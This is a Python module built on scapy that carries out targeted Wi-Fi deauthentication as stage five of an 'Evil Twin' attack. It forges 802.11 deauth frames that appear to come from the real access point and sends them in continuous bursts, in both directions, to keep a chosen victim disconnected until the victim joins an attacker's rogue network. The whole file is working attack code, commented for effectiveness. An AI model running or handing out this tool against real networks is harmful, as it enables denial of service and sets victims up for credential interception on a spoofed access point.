"""
deauth.py – Targeted Deauthentication Module
---------------------------------------------
Sends spoofed 802.11 Deauthentication frames to a specific client,
forcing them to disconnect from the legitimate AP.

Key security concept exploited:
  Management frames in 802.11 (WPA2 without 802.11w) are NOT authenticated.
  We can send a Deauth frame with the AP's BSSID as the source, and the
  client has no way to verify it's not from the real AP.

Stage 5 of the Evil Twin attack: Targeted Disconnection.

IMPORTANT: This module affects ONLY the selected victim client.
           Other clients on the network are NOT disrupted.
"""

import time
import threading
from scapy.all import (
    RadioTap, Dot11, Dot11Deauth,
    sendp
)


# ──────────────────────────────────────────────
# Deauth frame builder
# ──────────────────────────────────────────────

# Reason code 7: "Class 3 frame received from nonassociated STA"
# This is a common and realistic reason code that causes immediate disconnection.
DEAUTH_REASON = 7

def _build_deauth_frame(client_mac: str, ap_bssid: str) -> bytes:
    """
    Build a spoofed Deauthentication frame.

    Frame structure:
        RadioTap    – physical layer header (required for injection)
        Dot11       – 802.11 MAC header
            addr1   – Destination: the victim client
            addr2   – Source: spoofed as the real AP (BSSID)
            addr3   – BSSID: the real AP's MAC
            type=0  – Management frame
            subtype=12 – Deauthentication
        Dot11Deauth – reason code

    By setting addr2 (source) = real AP's BSSID, the client believes
    the disconnect request came from its own AP.
    """
    frame = (
        RadioTap() /
        Dot11(
            addr1=client_mac,    # To: victim
            addr2=ap_bssid,      # From: spoofed AP
            addr3=ap_bssid,      # BSSID: real AP
            type=0,              # Management
            subtype=12           # Deauthentication
        ) /
        Dot11Deauth(reason=DEAUTH_REASON)
    )
    return frame


def _build_deauth_frame_reverse(client_mac: str, ap_bssid: str) -> bytes:
    """
    Build the reverse direction: client → AP deauth.
    Sending both directions is more effective at forcing disconnection.
    """
    frame = (
        RadioTap() /
        Dot11(
            addr1=ap_bssid,      # To: AP
            addr2=client_mac,    # From: spoofed client
            addr3=ap_bssid,      # BSSID
            type=0,
            subtype=12
        ) /
        Dot11Deauth(reason=DEAUTH_REASON)
    )
    return frame


# ──────────────────────────────────────────────
# Deauth sender
# ──────────────────────────────────────────────

class DeauthAttack:
    """
    Continuously sends Deauth frames to keep a single client disconnected
    from the legitimate AP until they connect to our Evil Twin.
    """

    def __init__(self, iface: str, client_mac: str, ap_bssid: str,
                 burst: int = 64, interval: float = 0.0):
        """
        Args:
            iface:       Monitor-mode interface with packet injection support
            client_mac:  MAC address of the victim to deauthenticate
            ap_bssid:    BSSID of the legitimate AP (we spoof this)
            burst:       How many frames to send per cycle (more = more effective)
            interval:    Seconds between bursts
        """
        self.iface      = iface
        self.client_mac = client_mac.upper()
        self.ap_bssid   = ap_bssid.upper()
        self.burst      = burst
        self.interval   = interval

        self._stop_event = threading.Event()
        self._thread     = None

        # Pre-build the frames once (reuse across bursts for efficiency)
        self._frame_ap_to_client  = _build_deauth_frame(client_mac, ap_bssid)
        self._frame_client_to_ap  = _build_deauth_frame_reverse(client_mac, ap_bssid)

    def _send_loop(self):
        """
        Main loop: send burst of Deauth frames, wait, repeat.
        Sends frames in BOTH directions for maximum effectiveness.
        """
        while not self._stop_event.is_set():
            try:
                # AP → Client direction
                sendp(
                    self._frame_ap_to_client,
                    iface=self.iface,
                    count=self.burst,
                    inter=0.01,
                    verbose=False
                )
                # Client → AP direction (optional but effective)
                sendp(
                    self._frame_client_to_ap,
                    iface=self.iface,
                    count=self.burst,
                    inter=0.01,
                    verbose=False
                )
            except Exception as e:
                print(f"[!] Deauth send error: {e}")
                break

            time.sleep(self.interval)

    def start(self):
        """Start sending Deauth frames in a background thread."""
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._send_loop, daemon=True)
        self._thread.start()
        print(f"[+] Deauth attack started → victim: {self.client_mac} "
              f"(spoofing AP: {self.ap_bssid})")

    def stop(self):
        """Stop sending Deauth frames."""
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=2)
        print(f"[+] Deauth attack stopped for {self.client_mac}")

    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()
